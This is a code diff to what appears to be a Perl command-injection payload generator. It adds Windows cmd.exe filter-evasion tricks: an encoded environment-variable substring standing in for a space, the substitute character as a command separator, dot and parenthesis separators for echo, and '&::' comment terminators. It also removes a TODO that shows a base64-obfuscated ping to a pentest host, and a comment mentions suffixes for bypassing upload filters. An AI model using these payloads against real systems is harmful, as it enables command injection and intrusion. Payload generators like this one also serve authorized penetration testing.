@@ -33,14 +33,6 @@ my $TARGET_OS='win'; # other options include 'win' and 'all', 'nix' is the defau
 
 # Why we do not combine COMMAND_SEPARATORS along with COMMAND_TERMINATORS in one payload: any quotes will be handled by the prefix stuff anyway, while any fixed appendices will be ignored due to separators instead of terminators (and if separator is not accepted, the command will fail anyway, so there is no point in trailing it with a terminator)... hence, terminators should be used only mutually exclusively with separators!
 
-# OTHER IDEAS (TODO)
-# Additional evasive versions, e.g. double url-encode (or overlong utf) non-word characters (ARGUMENT_SEPARATORS, COMMAND_SEPARATORS, COMMAND_TERMINATORS)
-# Generate test cases FROM the payloads
-# Command line argument passing (to help automate payload generation)
-# Result payloads ordered starting from the most probable ones, to optimize the number of requests sent
-# Review and analyse the basic payload cases for any missing or faulty payloads
-## Bad character avoidance; there have to be some alternative payloads evading filters for particular characters; for instance "ping shell.a.pentest.co" might fail if "." is not allowed; while "ping $((echo  c2hlbGwuYS5wZW50ZXN0LmNvLnVrCg==|base64 -d))" would work otherwise (provided that its other characers are not blocked ofc), it's just an example; we need to develop some sort of bad character evasion like in meterpreter encoder ;)
-
 
 my @BASE_PAYLOADS=(
 $PAYL,
@@ -60,8 +52,14 @@ if($TARGET_OS eq 'nix'||$TARGET_OS eq 'all')
 }
 if($TARGET_OS eq 'win'||$TARGET_OS eq 'all')
 {
-	push(@ARGUMENT_SEPARATORS,'%ProgramFiles:~10,1%'); # a cmd-specific hacky way to use space without a space, too bad it uses other dodgy characters :)
+	push(@ARGUMENT_SEPARATORS,'%25ProgramFiles:~10,1%25'); # a cmd-specific hacky way to use space without a space, too bad it uses other dodgy characters, html-encoded
 	push(@COMMAND_SEPARATORS,chr(26)); # as I found out, so called substitute character works as cmd separator for echo in cmd :D	
+	if($COMMAND eq 'echo') # windows cmd.exe echo accepts a dot and ( as argument separators (and is almost never escaped), echo can be used to read variables
+	{
+		push(@ARGUMENT_SEPARATORS,'.');
+		push(@ARGUMENT_SEPARATORS,'(');
+	}
+	push(@COMMAND_TERMINATORS,'%26::'); # cmd.exe &:: inline comments
 }
 
 # invvvvv212.org','1', example.org for command injection into overlays of tools like whois. On the flip side, for file uploads these could be '.PNG', '.TXT','.DOC'optional list of suffixes to try (e.g. in order to bypass filters), used only with terminators
